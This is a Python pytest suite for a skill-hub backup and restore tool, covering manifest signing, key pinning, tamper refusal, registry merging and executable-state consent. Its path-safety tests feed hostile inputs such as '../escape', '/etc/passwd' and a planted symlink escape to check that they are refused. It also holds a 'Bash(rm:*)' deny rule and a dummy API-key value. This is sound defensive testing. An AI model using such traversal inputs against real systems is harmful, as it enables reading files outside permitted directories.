"""Tests for `restore.py` + `hub restore` / `hub source restore` (design v2 §5, §6, §10).

The centrepiece is the BEHAVIOURAL round-trip gate (§10): seed a data home on
"machine A", snapshot it, restore it onto a "machine B" with a different `$HOME`
and different harness homes, sync, and then assert on the RESULT — every
resolved symlink points at something that exists, sync reports no missing
sources, and a fresh snapshot of B reproduces A's byte-for-byte (modulo the
per-machine manifest and audit ledger). A mock could not make any of those true.

Everything runs under the autouse harness-isolation guard from `conftest.py`,
plus a per-test `$HOME` swap, so nothing here can read or write a real harness
dir, a real data home, or a real backup repo.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
from pathlib import Path

import pytest
import yaml

import hub
from skill_hub.application.backup import backup, restore
from skill_hub.infrastructure.backup import backup_git

_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _plain(text: str) -> str:
    return _ANSI.sub("", text)


def _ns(**kw):
    base = {
        "from_": None,
        "branch": None,
        "mode": None,
        "apply": False,
        "force": False,
        "accept_executable_state": False,
        "trust_new_key": False,
        "sync": False,
        "json": False,
    }
    base.update(kw)
    return argparse.Namespace(**base)


# ─────────────────────────────────────────────────────────────────────────────
# Machine fixtures: a whole fake home, swappable mid-test
# ─────────────────────────────────────────────────────────────────────────────


def use_home(monkeypatch, home: Path) -> Path:
    """Point HOME, the data home, and both harness homes at `home`. Returns the data home.

    Swapping `$HOME` is the only way to prove the path transform actually
    travels: with one home, `{HOME}` and `{DATA_HOME}` expand back to the same
    bytes they came from and a no-op transform would pass.
    """
    home.mkdir(parents=True, exist_ok=True)
    (home / ".claude" / "projects").mkdir(parents=True, exist_ok=True)  # makes claude-code "installed"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("SKILL_HUB_HOME", str(home / ".skill-hub"))
    monkeypatch.setenv("SKILL_HUB_CLAUDE_HOME", str(home / ".claude"))
    monkeypatch.setenv("CODEX_HOME", str(home / ".codex"))
    monkeypatch.delenv("SKILL_HUB_DIR", raising=False)
    monkeypatch.delenv("SKILL_HUB_CODE", raising=False)
    hub._DATA_HOME_CACHE = None
    hub._DEPRECATION_WARNED = False
    hub._LEGACY_FALLBACK_WARNED = False
    return hub.data_home()


@pytest.fixture
def outside(tmp_path_factory):
    """A scratch dir OUTSIDE the data home.

    `tmp_data_home` resolves to pytest's `tmp_path` itself, so a project path
    built from `tmp_path` would sit INSIDE the data home — which the snapshot's
    prefix gate (rightly) refuses, for reasons that have nothing to do with what
    these tests are checking.
    """
    return tmp_path_factory.mktemp("outside")


@pytest.fixture
def claude_global_doc(monkeypatch):
    """Re-arm claude-code's `global_doc` (the isolation guard nulls it).

    Rebuilt from the ALREADY-PATCHED registry so `global_mcp_config=None` from
    the other guard survives — otherwise re-arming one field would silently
    un-isolate the user's real `~/.claude.json`.
    """
    import dataclasses
    from pathlib import PurePath

    from skill_hub.infrastructure.harnesses import harnesses

    patched = dict(harnesses.HARNESSES)
    patched["claude-code"] = dataclasses.replace(
        patched["claude-code"], global_doc=PurePath("~/.claude/CLAUDE.md")
    )
    monkeypatch.setattr(harnesses, "HARNESSES", patched)
    return patched


def write_skill(root: Path, name: str, body: str = "body\n") -> Path:
    d = root / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(
        "---\nname: {0}\ndescription: seeded\n---\n{1}".format(name, body)
    )
    return d


def seed_machine_a(home: Path, *, project_out: Path) -> dict:
    """A data home with content on every axis the snapshot claims to carry."""
    dh = hub.data_home()
    write_skill(dh / "skills", "alpha")
    write_skill(dh / "skills", "beta")
    (dh / "snippets").mkdir(parents=True, exist_ok=True)
    (dh / "snippets" / "house-style.md").write_text("house style\n")
    (dh / "mcp-servers" / "notes").mkdir(parents=True, exist_ok=True)
    (dh / "mcp-servers" / "notes" / "server.py").write_text("print('notes')\n")
    (dh / "connectors").mkdir(parents=True, exist_ok=True)
    (dh / "connectors" / "mine.py").write_text("# a drop-in connector\n")

    # sub-agents, in the env-honouring locations the gather code actually reads
    (home / ".claude" / "agents").mkdir(parents=True, exist_ok=True)
    (home / ".claude" / "agents" / "reviewer.md").write_text(
        "---\nname: reviewer\ndescription: reviews\n---\nreview things\n"
    )
    (home / ".codex" / "agents").mkdir(parents=True, exist_ok=True)
    (home / ".codex" / "agents" / "reviewer.toml").write_text(
        'name = "reviewer"\ninstructions = "review things"\n'
    )
    (home / ".claude" / "CLAUDE.md").write_text("# global instructions\n")

    (dh / "state" / "subagents").mkdir(parents=True, exist_ok=True)
    (dh / "state" / "subagents" / "links.json").write_text(
        json.dumps(
            {"links": [{"name": "reviewer", "scope": "user",
                        "harnesses": ["claude-code", "codex"]}]},
            indent=2,
            ensure_ascii=False,
        )
        + "\n"
    )

    # a hook whose command is machine-absolute BY DESIGN (no transform owns it)
    hook_script = home / "bin" / "lint.sh"
    hook_script.parent.mkdir(parents=True, exist_ok=True)
    hook_script.write_text("#!/bin/sh\nexit 0\n")
    hook_script.chmod(0o755)

    # one tilde-collapsed project path, one absolute path outside the home
    proj_in = home / "proj-one"
    proj_in.mkdir(parents=True, exist_ok=True)
    project_out.mkdir(parents=True, exist_ok=True)

    registry = {
        "version": "1",
        "harnesses_global": ["claude-code"],
        "skills": {
            "alpha": {
                "version": "1.0.0",
                "description": "",
                "source": str(dh / "skills" / "alpha"),
                "type": "claude-skill",
                "scope": "portable",
                "classification": {
                    "classes": ["release coordination"],
                    "outputs": ["research report", "migration note"],
                    "working_mode": "delegator",
                    "interaction_style": "checkpointed",
                    "maturity": "trusted",
                },
            },
            "beta": {
                "version": "1.0.0",
                "description": "",
                "source": "~/.skill-hub/skills/beta",  # tilde-collapsed on purpose
                "type": "claude-skill",
                "scope": "portable",
            },
            "notes": {
                "version": "1.0.0",
                "description": "",
                "source": str(dh / "mcp-servers" / "notes"),
                "type": "mcp-server",
                "scope": "portable",
                "mcp": {
                    "command": "python3",
                    "args": [str(dh / "mcp-servers" / "notes" / "server.py")],
                    "env": {"NOTES_API_KEY": "sk-livekeyvalue1234567890abcd"},
                },
            },
        },
        "bundles": {"core": {"description": "core", "scope": "project-specific",
                             "skills": ["alpha", "beta"]}},
        "projects": {
            "proj-one": {"path": "~/proj-one", "bundles": ["core"], "enabled": []},
            "proj-out": {"path": str(project_out), "bundles": [], "enabled": ["alpha"]},
        },
        "hooks": {
            "lint": {
                "event": "PostToolUse",
                "command": str(hook_script),
                "tools": ["Edit"],
            }
        },
        "hooks_global": ["lint"],
        "permissions_global": {
            "allow": [{"pattern": "Bash(npm:*)", "kind": "allow"}],
            "deny": [],
            "ask": [],
        },
    }
    hub.save_registry(registry)
    # Let the load-time migrations settle so the snapshot captures a stable shape.
    hub.save_registry(hub.load_registry())
    return registry


def snapshot(dest: Path) -> dict:
    return backup.assemble_snapshot(dest)


def tree_map(root: Path, *, skip=("manifest.json", "manifest.sig", "audit")) -> dict:
    """`{relpath: bytes}` for a snapshot, minus the per-machine files."""
    out: dict = {}
    for path in sorted(Path(root).rglob("*")):
        rel = path.relative_to(root).as_posix()
        if rel == ".git" or rel.startswith(".git/"):
            continue
        if rel in skip or any(rel.startswith(s + "/") for s in skip):
            continue
        if path.is_symlink() or not path.is_file():
            continue
        out[rel] = path.read_bytes()
    return out


# ─────────────────────────────────────────────────────────────────────────────
# 1. Manifest signing + TOFU (design §5 "integrity/trust")
# ─────────────────────────────────────────────────────────────────────────────


def test_snapshot_is_signed_and_verifies(tmp_data_home, tmp_path):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    summary = snapshot(dest)
    assert summary["signed"] is True
    assert (dest / "manifest.sig").is_file()
    pub = summary["manifest"]["signing"]["pubkey"]
    assert pub.startswith("ssh-")
    verdict = backup.verify_snapshot_signature(dest)
    assert verdict["state"] == backup.SIG_SIGNED, verdict


def test_signature_and_digest_are_not_part_of_the_tree_they_cover(tmp_data_home, tmp_path):
    """A digest that included its own signature could never be verified twice."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    assert backup.verify_tree_digest(dest)["ok"] is True
    # …and a re-verify after the sig exists still passes (the circularity check).
    assert backup.verify_tree_digest(dest)["ok"] is True


def test_tampered_snapshot_is_refused(tmp_data_home, tmp_path, monkeypatch):
    """Flip ONE byte of skill content: the digest gate must abort the restore."""
    write_skill(tmp_data_home / "skills", "alpha", body="original\n")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    victim = dest / "skills" / "alpha" / "SKILL.md"
    raw = victim.read_bytes()
    victim.write_bytes(raw.replace(b"original", b"0riginal"))

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": str(dest), "detail": ""},
        target_registry={},
        mode="replace",
        data_home=tmp_data_home,
        code_home=None,
        home=Path.home(),
        trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["fatal"] is True
    assert plan["ok"] is False
    assert "digest" in " ".join(plan["errors"]).lower()
    # And nothing past the manifest was even looked at.
    assert "resolved_registry" not in plan


def test_tampered_manifest_fails_the_signature_not_just_the_digest(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    manifest = json.loads((dest / "manifest.json").read_text())
    manifest["hostname"] = "somebody-elses-laptop"
    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n")
    verdict = backup.verify_snapshot_signature(dest)
    assert verdict["state"] == backup.SIG_INVALID


def test_unknown_signer_is_tofu_gated_then_pinned(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    snap = {"dir": dest, "source": str(dest), "key": restore.source_key(str(dest)), "detail": ""}

    without = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert without["integrity"]["trust"]["state"] == restore.TRUST_NEW_KEY
    assert without["ok"] is False
    assert without["fatal"] is False  # gated, not fatal: the dry run still shows you the plan
    assert "UNVERIFIED SNAPSHOT" in " ".join(without["errors"])

    with_flag = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert with_flag["ok"] is True
    restore.apply_plan(with_flag, data_home=tmp_data_home)
    pins = restore.read_pins(tmp_data_home)
    assert restore.source_key(str(dest)) in pins

    # Now the same source verifies silently — no flag needed.
    again = restore.build_plan(
        snap, target_registry=hub._read_registry_optional(), mode="replace",
        data_home=tmp_data_home, code_home=None, home=Path.home(),
        accept_executable_state=True,
    )
    assert again["integrity"]["trust"]["state"] == restore.TRUST_VERIFIED


def test_a_second_signer_for_a_pinned_source_is_consent_gated_then_added(
    tmp_data_home, tmp_path
):
    """A source is a FLEET, so its pin is a SET of signers, not one key.

    The laptop and the desktop push to the same backup repo and each signs with
    its own hub key, so "signed by a key this source has not used before" is the
    ordinary multi-machine case — it must be consent-gated, not refused outright.
    Pinning the second key must not un-pin the first, or every alternating
    restore re-prompts forever.
    """
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    key = restore.source_key(str(dest))
    other = "ssh-ed25519 AAAAsomeothertotallydifferentkey other"
    restore.write_pin(key, other, data_home=tmp_data_home)

    snap = {"dir": dest, "source": str(dest), "key": key, "detail": ""}

    # Without consent it is refused — but as a GATE, not a fatal.
    gated = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert gated["integrity"]["trust"]["state"] == restore.TRUST_NEW_KEY
    assert gated["ok"] is False
    assert gated["fatal"] is False
    assert "not among the 1 key(s) pinned" in gated["integrity"]["trust"]["detail"]

    plan = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["fatal"] is False
    assert plan["ok"] is True
    restore.apply_plan(plan, data_home=tmp_data_home)

    # BOTH signers are pinned now, and the accepted one verifies silently.
    from skill_hub.infrastructure.connectors import signing as _signing

    pins = restore.read_pins(tmp_data_home)
    assert len(restore.pinned_keys(pins, key)) == 2
    assert _signing._normalize_pubkey(other) in restore.pinned_keys(pins, key)

    again = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert again["integrity"]["trust"]["state"] == restore.TRUST_VERIFIED


def test_two_machines_signing_one_source_both_verify_after_consent(
    tmp_data_home, tmp_path
):
    """The end-to-end multi-machine gate: A-signed then B-signed, both accepted.

    Each snapshot is signed by a DIFFERENT real hub key (re-generated in the
    signing dir between the two), which is the actual fleet shape — not two
    entries hand-written into the pin file.
    """
    from skill_hub.infrastructure.connectors import signing as _signing

    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    source = tmp_path / "snap"

    snapshot(source)
    key_a = backup.manifest_signer(backup.read_manifest(source))
    src_key = restore.source_key(str(source))
    snap = {"dir": source, "source": str(source), "key": src_key, "detail": ""}

    plan_a = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan_a["ok"] is True
    restore.apply_plan(plan_a, data_home=tmp_data_home)

    # Machine B: a different signing key writes the SAME source.
    for leftover in sorted(_signing.signing_dir().glob("*")):
        leftover.unlink()
    snapshot(source)
    key_b = backup.manifest_signer(backup.read_manifest(source))
    assert key_b and key_b.strip() != str(key_a).strip(), "B must sign with a new key"

    gated = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert gated["integrity"]["trust"]["state"] == restore.TRUST_NEW_KEY
    assert gated["fatal"] is False, "a second machine is not a substitution attack"

    plan_b = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan_b["ok"] is True
    restore.apply_plan(plan_b, data_home=tmp_data_home)

    # Both keys are pinned; A's key still verifies with no consent at all.
    pins = restore.read_pins(tmp_data_home)
    assert len(restore.pinned_keys(pins, src_key)) == 2
    for pub in (key_a, key_b):
        verdict = {
            "state": backup.SIG_SIGNED,
            "pubkey": pub,
            "key_id": _signing.key_id(pub),
        }
        assert (
            restore.classify_trust(verdict, key=src_key, pins=pins)["state"]
            == restore.TRUST_VERIFIED
        )


def test_a_tampered_snapshot_stays_a_hard_refusal_for_a_pinned_source(
    tmp_data_home, tmp_path
):
    """Widening the key SET must not widen what a bad SIGNATURE buys."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    key = restore.source_key(str(dest))
    restore.write_pin(
        key, backup.manifest_signer(backup.read_manifest(dest)), data_home=tmp_data_home
    )
    manifest = json.loads((dest / "manifest.json").read_text())
    manifest["hostname"] = "somebody-elses-laptop"
    (dest / "manifest.json").write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n"
    )

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": key, "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["fatal"] is True
    assert plan["integrity"]["trust"]["state"] == restore.TRUST_INVALID
    assert plan["ok"] is False


def test_a_corrupt_pin_store_is_a_hard_error_not_an_empty_one(tmp_data_home):
    """Failing open here would silently discard every pin this machine holds."""
    path = restore.signers_path(tmp_data_home)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{not json at all")
    with pytest.raises(restore.RestoreError) as exc:
        restore.read_pins(tmp_data_home)
    assert "corrupt" in str(exc.value)

    path.write_text(json.dumps({"signers": ["not", "a", "mapping"]}))
    with pytest.raises(restore.RestoreError):
        restore.read_pins(tmp_data_home)

    # A store that was never written is the ordinary first-run case.
    path.unlink()
    assert restore.read_pins(tmp_data_home) == {}


def test_a_pinned_source_may_not_downgrade_to_unsigned(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    key = restore.source_key(str(dest))
    pub = backup.manifest_signer(backup.read_manifest(dest))
    restore.write_pin(key, pub, data_home=tmp_data_home)
    (dest / "manifest.sig").unlink()

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": key, "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["integrity"]["trust"]["state"] == restore.TRUST_MISMATCH
    assert plan["fatal"] is True


# ─────────────────────────────────────────────────────────────────────────────
# 2. Path safety (design §5 "reject symlink entries; re-validate after resolve")
# ─────────────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "evil",
    ["../escape", "a/../../escape", "/etc/passwd", "skills/../../outside"],
)
def test_path_traversal_is_refused(tmp_path, evil):
    with pytest.raises(restore.RestoreError):
        restore._safe_join(tmp_path / "root", evil)


def test_safe_join_catches_an_escape_that_only_appears_after_resolve(tmp_path):
    root = tmp_path / "root"
    (root).mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    os.symlink(outside, root / "link")
    with pytest.raises(restore.RestoreError):
        restore._safe_join(root, "link/pwned")


def test_symlink_entries_in_a_snapshot_are_never_materialized(
    tmp_data_home, tmp_path, monkeypatch
):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    # Plant a symlink INSIDE the snapshot after it was built, and re-stamp the
    # digest so the entry reaches the materializer rather than being caught by
    # the integrity gate first (that is a different test).
    os.symlink(tmp_path / "elsewhere", dest / "skills" / "alpha" / "sneaky")
    _files, digest = backup.compute_tree_digest(dest)
    manifest = json.loads((dest / "manifest.json").read_text())
    manifest["tree_digest"] = digest
    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n")
    (dest / "manifest.sig").unlink()

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"] is True
    rejected = {r["rel"] for r in plan["rejected"]}
    assert "skills/alpha/sneaky" in rejected
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert not (tmp_data_home / "skills" / "alpha" / "sneaky").exists()


# ─────────────────────────────────────────────────────────────────────────────
# 3. Registry modes (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def _tiny_snapshot(tmp_path: Path, registry: dict, *, data_home: Path) -> Path:
    hub.save_registry(registry)
    dest = tmp_path / ("snap-" + str(len(list(tmp_path.iterdir()))))
    snapshot(dest)
    return dest


def test_non_empty_target_without_a_mode_is_refused_with_a_diff(
    tmp_data_home, tmp_path, outside
):
    write_skill(tmp_data_home / "skills", "alpha")
    incoming = {
        "version": "1",
        "skills": {},
        "bundles": {},
        "projects": {"from-backup": {"path": str(outside / "pb"), "bundles": []}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)

    target = {
        "version": "1",
        "skills": {},
        "bundles": {},
        "projects": {"local-only": {"path": str(outside / "lo"), "bundles": []}},
    }
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry=target, mode=None, data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"] is False
    assert plan["registry"]["mode_required"] is True
    assert plan["registry"]["diff"]["sections"]["projects"]["lost"] == ["local-only"]
    joined = " ".join(plan["errors"])
    assert "--mode replace" in joined and "would be LOST" in joined


def test_replace_enumerates_every_entry_and_top_level_key_that_is_lost(tmp_path, tmp_data_home):
    target = {
        "version": "1",
        "projects": {"gone": {"path": "/tmp/gone"}},
        "bundles": {"gone-bundle": {"skills": []}},
        "skills": {},
        "harnesses_global": ["claude-code"],
        "agent_docs": {"root_strategy": "import"},
    }
    incoming = {"version": "1", "projects": {}, "bundles": {}, "skills": {}}
    diff = restore.diff_registry(target, incoming)
    assert diff["sections"]["projects"]["lost"] == ["gone"]
    assert diff["sections"]["bundles"]["lost"] == ["gone-bundle"]
    assert "agent_docs" in diff["top_level_lost"]
    assert "harnesses_global" in diff["top_level_lost"]
    assert diff["totals"]["lost"] == 2


def test_merge_unions_and_lists_conflicts_with_the_backup_winning():
    target = {
        "projects": {"keep": {"path": "/keep"}, "both": {"path": "/local"}},
        "bundles": {},
        "skills": {},
    }
    incoming = {
        "projects": {"new": {"path": "/new"}, "both": {"path": "/backup"}},
        "bundles": {},
        "skills": {},
    }
    diff = restore.diff_registry(target, incoming)
    assert diff["sections"]["projects"]["conflicts"] == ["both"]
    merged = restore.merge_registry(target, incoming)
    assert set(merged["projects"]) == {"keep", "both", "new"}
    assert merged["projects"]["both"]["path"] == "/backup"  # backup wins
    assert merged["projects"]["keep"]["path"] == "/keep"    # nothing lost


def test_restore_merge_carries_custom_skill_classification(tmp_data_home, tmp_path, capsys):
    write_skill(tmp_data_home / "skills", "classified")
    hub.save_registry(
        {
            "version": "1",
            "skills": {
                "classified": {
                    "source": str(tmp_data_home / "skills" / "classified"),
                    "type": "claude-skill",
                    "scope": "portable",
                    "classification": {
                        "classes": ["release coordination"],
                        "outputs": ["research report", "migration note"],
                        "working_mode": "delegator",
                    },
                }
            },
            "projects": {},
            "bundles": {},
        }
    )
    source = tmp_path / "classified-snapshot"
    snapshot(source)
    hub.save_registry(
        {
            "version": "1",
            "skills": {
                "classified": {
                    "source": str(tmp_data_home / "skills" / "classified"),
                    "type": "claude-skill",
                    "scope": "portable",
                    "classification": {"classes": ["local value"]},
                }
            },
            "projects": {},
            "bundles": {},
        }
    )
    hub.cmd_restore(
        _ns(
            from_=str(source),
            mode="merge",
            apply=True,
            trust_new_key=True,
            accept_executable_state=True,
        )
    )
    capsys.readouterr()
    assert hub._read_registry_optional()["skills"]["classified"]["classification"] == {
        "classes": ["release coordination"],
        "outputs": ["research report", "migration note"],
        "working_mode": "delegator",
    }


def test_replace_preserves_the_machine_local_keys_a_snapshot_never_carries():
    target = {
        "projects": {},
        "signing": {"pubkey": "ssh-ed25519 LOCAL", "key_id": "SHA256:local"},
        "backup": {"dir": "~/.skill-hub-backup", "enabled": True},
        "bootstrap": {"completed_at": "2020-01-01T00:00:00Z"},
    }
    out = restore.replace_registry(target, {"projects": {"a": {}}})
    assert out["signing"] == target["signing"]
    assert out["backup"] == target["backup"]
    assert out["projects"] == {"a": {}}


# ─────────────────────────────────────────────────────────────────────────────
# 4. Executable-state consent (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def test_executable_state_is_enumerated_and_gates_apply(tmp_data_home, tmp_path, outside):
    missing = outside / "nope" / "hook.sh"
    incoming = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {
            "p": {
                "path": str(outside / "p"),
                "permissions": {"allow": [{"pattern": "Bash(git push:*)", "kind": "allow"}]},
            }
        },
        "hooks": {"danger": {"event": "PreToolUse", "command": str(missing) + " --run"}},
        "hooks_global": ["danger"],
        "permissions_global": {"deny": [{"pattern": "Bash(rm:*)", "kind": "deny"}]},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    snap = {"dir": dest, "source": str(dest), "key": "k", "detail": ""}

    plan = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    exec_state = plan["executable_state"]
    assert [h["name"] for h in exec_state["hooks"]] == ["danger"]
    # The command string is shown VERBATIM — that is the whole point of consent.
    assert exec_state["hooks"][0]["command"] == str(missing) + " --run"
    assert exec_state["hooks"][0]["broken"] is True
    assert str(missing) in exec_state["hooks"][0]["missing_paths"]
    assert exec_state["broken_hooks"] == ["danger"]
    kinds = {(r["kind"], r["pattern"]) for r in exec_state["permission_rules"]}
    assert ("deny", "Bash(rm:*)") in kinds
    assert ("allow", "Bash(git push:*)") in kinds
    assert [t["project"] for t in exec_state["codex_trust"]] == ["p"]
    assert plan["ok"] is False
    assert "--accept-executable-state" in " ".join(plan["errors"])

    accepted = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert accepted["ok"] is True
    assert any("do not exist here" in w for w in accepted["warnings"])


def test_an_unbounded_bash_rule_does_not_claim_a_codex_trust_grant():
    """`Bash(*)` is a SkipReason for the Codex adapter, so it grants no trust."""
    registry = {
        "projects": {
            "p": {"path": "/p", "permissions": {"allow": [{"pattern": "Bash(*)", "kind": "allow"}]}}
        }
    }
    assert restore.collect_executable_state(registry)["codex_trust"] == []


def test_machine_absolute_fields_are_reported_per_entry(tmp_path):
    registry = {
        "hooks": {"h": {"event": "PostToolUse", "command": "/opt/tools/lint.sh --fix"}},
        "projects": {
            "p": {
                "path": "/p",
                "hook_settings": {"h": {"config": "/etc/lint.toml"}},
                "permissions": {"additional_dirs": ["/srv/shared"]},
            }
        },
        "permissions_global": {"additional_dirs": ["~/scratch"]},
    }
    found = {(e["field"], e["value"]) for e in restore.collect_machine_absolute(registry)}
    assert ("hooks.h.command", "/opt/tools/lint.sh") in found
    assert ("projects.p.hook_settings.h.config", "/etc/lint.toml") in found
    assert ("projects.p.permissions.additional_dirs[0]", "/srv/shared") in found
    assert ("permissions_global.additional_dirs[0]", "~/scratch") in found


def test_machine_absolute_reports_every_hook_command_place():
    """T12. The three permissions-block hook lists join the top-level library;
    `hook_settings` and `additional_dirs` rows are unchanged — no row dropped."""
    command = "/opt/tools/lint.sh"
    hook_entry = {"event": "PreToolUse", "matcher": "Bash", "command": command}
    registry = {
        "permissions_global": {"hooks": [dict(hook_entry)]},
        "projects": {
            "p": {
                "path": "/p",
                "permissions": {"hooks": [dict(hook_entry)]},
                "permissions_local": {"hooks": [dict(hook_entry)]},
                "hook_settings": {"h": {"config": "/etc/lint.toml"}},
            }
        },
    }
    found = {(e["field"], e["value"]) for e in restore.collect_machine_absolute(registry)}
    assert ("permissions_global.hooks[0].command", command) in found
    assert ("projects.p.permissions.hooks[0].command", command) in found
    assert ("projects.p.permissions_local.hooks[0].command", command) in found
    assert ("projects.p.hook_settings.h.config", "/etc/lint.toml") in found


def test_a_multi_fragment_permissions_hook_command_is_never_marked_rewritten():
    """R9 (review 4b #9). A permissions-block hook command that splits into
    MORE than one whitespace-delimited path-ish row can silently truncate one
    of them (`_command_paths`), so none of that field's rows can be pinned to
    its own tokenized evidence with confidence — `rewritten` stays False for
    all of them, the honest 'carried verbatim; verify on this machine'
    wording, even when the field IS in `rewritten_fields`. A single-path
    command on the same field still reports True."""
    field = "permissions_global.hooks[0].command"
    dual_command = "bash /A/.skill-hub/s/x.sh --root /A/.skill-hub/skills/s"
    dual_registry = {
        "permissions_global": {
            "hooks": [{"event": "PreToolUse", "matcher": "Bash", "command": dual_command}]
        }
    }
    dual_rows = restore.collect_machine_absolute(
        dual_registry, rewritten_fields=frozenset({field})
    )
    assert len(dual_rows) == 2
    assert all(row["rewritten"] is False for row in dual_rows)

    single_command = "/A/.skill-hub/s/x.sh"
    single_registry = {
        "permissions_global": {
            "hooks": [{"event": "PreToolUse", "matcher": "Bash", "command": single_command}]
        }
    }
    single_rows = restore.collect_machine_absolute(
        single_registry, rewritten_fields=frozenset({field})
    )
    assert len(single_rows) == 1
    assert single_rows[0]["rewritten"] is True


def test_rewritten_is_evidence_from_the_portable_value_not_a_prefix_guess():
    """T11. Grill #9 + #11. `rewritten` comes from the FIELD PATH the
    transform actually touched (`backup.tokenized_fields`), never from testing
    whether the value in hand merely LOOKS like it is under the data home."""
    portable = {
        "hooks": {
            "dual": {"command": "bash {DATA_HOME}/s/x.sh --root {DATA_HOME}/skills/s"},
            "spacey": {"command": "{DATA_HOME}/skills/my skill/scripts/x.sh"},
            "tilde": {"command": "bash ~/.skill-hub/s/x.sh"},
            "outside": {"command": "/opt/tools/lint.sh"},
        }
    }
    rewritten_fields = backup.tokenized_fields(portable)
    assert rewritten_fields == frozenset({"hooks.dual.command", "hooks.spacey.command"})

    # The RESOLVED (expanded) registry this machine would actually restore —
    # built directly so the "tilde" value can literally start with the string
    # "~/.skill-hub", the exact machine prefix a naive guess would (wrongly)
    # read as evidence of a repair.
    resolved = {
        "hooks": {
            "dual": {"command": "bash /A/.skill-hub/s/x.sh --root /A/.skill-hub/skills/s"},
            "spacey": {"command": "/A/.skill-hub/skills/my skill/scripts/x.sh"},
            "tilde": {"command": "bash ~/.skill-hub/s/x.sh"},
            "outside": {"command": "/opt/tools/lint.sh"},
        }
    }
    rows = restore.collect_machine_absolute(resolved, rewritten_fields=rewritten_fields)
    by_field = {(r["field"], r["value"]): r["rewritten"] for r in rows}

    # Both truncated fragments of the dual-occurrence command share the SAME
    # field path, so both are correctly True.
    assert by_field[("hooks.dual.command", "/A/.skill-hub/s/x.sh")] is True
    assert by_field[("hooks.dual.command", "/A/.skill-hub/skills/s")] is True
    # The space-truncated fragment is True too — the field carried the token;
    # the displayed VALUE being truncated is unrelated to the flag.
    assert by_field[("hooks.spacey.command", "/A/.skill-hub/skills/my")] is True
